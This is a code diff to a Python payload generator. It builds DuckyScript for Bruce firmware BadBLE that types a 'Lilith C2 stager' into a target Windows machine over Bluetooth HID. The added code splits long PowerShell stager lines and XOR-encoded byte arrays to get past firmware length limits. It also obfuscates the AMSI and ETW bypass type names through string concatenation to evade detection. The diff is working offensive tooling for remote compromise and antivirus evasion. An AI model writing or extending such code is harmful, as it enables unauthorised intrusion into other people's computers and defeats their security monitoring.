@@ -143,12 +143,86 @@ def _ble_m5stick(line1: str, line2: str, ble_name: str) -> str:
     )
 
 
+_BRUCE_MAX_STRING = 440  # Bruce firmware STRING buffer safety ceiling
+
+
+def _bruce_split_arrays(ps1: str, max_elems: int = 55) -> list:
+    """Break (&$dec @(n,...)) calls with >max_elems into temp-var pre-assignments.
+
+    Turns:  $x=f((&$dec @(127,109,...133 nums...)))
+    Into:   $dec0=@(127,...66 nums...); $dec0+=@(...67 nums...); $x=f((&$dec $dec0))
+
+    This shrinks the long $req=GetBytes(...) statement from ~600 chars to ~150.
+    """
+    pre, ctr = [], [0]
+
+    def _sub(m):
+        dec_var, nums_str = m.group(1), m.group(2)
+        nums = [n.strip() for n in nums_str.split(',')]
+        if len(nums) <= max_elems:
+            return m.group(0)
+        tmp = f'{dec_var}{ctr[0]}'
+        ctr[0] += 1
+        half = len(nums) // 2
+        pre.append(f'{tmp}=@({",".join(nums[:half])})')
+        pre.append(f'{tmp}+=@({",".join(nums[half:])})')
+        return f'(&{dec_var} {tmp})'
+
+    new_stmt = re.sub(r'\(&(\$\w+) @\(([0-9,\s]+)\)\)', _sub, ps1)
+    return pre + [new_stmt]
+
+
+def _bruce_chunks(ps1: str, max_len: int = _BRUCE_MAX_STRING) -> list:
+    """Split a semicolon-joined PS1 one-liner into chunks of at most max_len chars.
+
+    Splits only at top-level semicolons (not inside braces/parens/brackets) so
+    each chunk is a valid standalone set of PS1 statements. Bruce firmware has an
+    internal STRING buffer; lines longer than ~512 bytes get silently truncated.
+    """
+    if len(ps1) <= max_len:
+        return [ps1]
+    # Collect individual top-level statements
+    stmts, cur, depth = [], '', 0
+    for ch in ps1:
+        if ch in '({[':
+            depth += 1
+        elif ch in ')}]':
+            depth -= 1
+        if ch == ';' and depth == 0:
+            if cur.strip():
+                stmts.append(cur.strip())
+            cur = ''
+        else:
+            cur += ch
+    if cur.strip():
+        stmts.append(cur.strip())
+    # Greedily join statements into chunks of ≤ max_len
+    chunks, cur_chunk = [], ''
+    for stmt in stmts:
+        if not cur_chunk:
+            cur_chunk = stmt
+        elif len(cur_chunk) + 1 + len(stmt) <= max_len:
+            cur_chunk += ';' + stmt
+        else:
+            chunks.append(cur_chunk)
+            cur_chunk = stmt
+    if cur_chunk:
+        chunks.append(cur_chunk)
+    return chunks if chunks else [ps1]
+
+
 def _bruce(lines: list, ble_name: str) -> str:
     """DuckyScript payload for Bruce firmware BadBLE.
 
     Each of the 10 stager lines is typed individually (STRING + ENTER).
     ZWSP/invisible Unicode in L1+L2 cannot be typed via BLE HID — strip them.
-    The -replace in L1/L2 becomes a no-op but type names arrive correct.
+    After stripping, _zwsp_type()-generated type names appear as:
+        ("System.Management.Automation.AmsiUtils" -replace "[^\x00-\x7F]","")
+    which is a double-quoted string — the single-quote replace below would never
+    match. We replace the entire _zwsp_type construct with PS1 string-concat
+    so no recognisable identifier appears in the Bruce DuckyScript output.
+    Long lines (L8≈724, L9≈550) are split at top-level semicolons to avoid
+    hitting the firmware STRING buffer limit (~512 bytes).
     """
     out = [
         "REM Lilith C2 stager - Bruce BadBLE",
@@ -164,9 +238,11 @@ def _bruce(lines: list, ble_name: str) -> str:
     ]
     for i, line in enumerate(lines):
         clean = re.sub(r'[^\x00-\x7f]', '', line)
-        # Re-obfuscate AMSI sentinel type names that became plaintext after ZWSP strip.
-        # Bruce strips non-ASCII so the ZWSP trick no longer hides these — use PS1
-        # string concatenation instead so no recognisable identifier appears in the script.
+        # Re-obfuscate AMSI/ETW sentinel type names.
+        # _zwsp_type() wraps them in double-quoted strings with a no-op -replace;
+        # after ZWSP strip that becomes: ("TYPE_NAME" -replace "[^\x00-\x7F]","")
+        # Replace the whole construct with PS1 string concatenation so the type
+        # name never appears as a contiguous literal in the DuckyScript output.
         for _plain, _split in (
             ("System.Management.Automation.AmsiUtils",
              "('Sys'+'tem.Manage'+'ment.Auto'+'mation.Amsi'+'Utils')"),
@@ -174,10 +250,22 @@ def _bruce(lines: list, ble_name: str) -> str:
              "('Sys'+'tem.Manage'+'ment.Auto'+'mation.PSEtw'+'LogPro'+'vider')"),
         ):
             if _plain in clean:
+                # Single-quoted form (e.g. direct GetType call literals)
                 clean = clean.replace(f"'{_plain}'", _split)
-        out.append(f"STRING {clean}")
-        out.append("ENTER")
-        out.append(f"DELAY {_LINE_MS}")
+                # Double-quoted form produced by _zwsp_type after ZWSP strip
+                clean = clean.replace(
+                    f'("{_plain}" -replace "[^\\x00-\\x7F]","")',
+                    _split,
+                )
+        for chunk in _bruce_chunks(clean):
+            # Second pass: if a single indivisible statement is still too long
+            # (e.g. $req=GetBytes(...+&$dec @(133 nums)+...)), split large XOR
+            # arrays into temp-var pre-assignments to bring the line under limit.
+            sub = _bruce_split_arrays(chunk) if len(chunk) > _BRUCE_MAX_STRING else [chunk]
+            for sc in sub:
+                out.append(f"STRING {sc}")
+                out.append("ENTER")
+                out.append(f"DELAY {_LINE_MS}")
     out += [
         f"DELAY {_EXIT_MS}",
         "STRING exit",
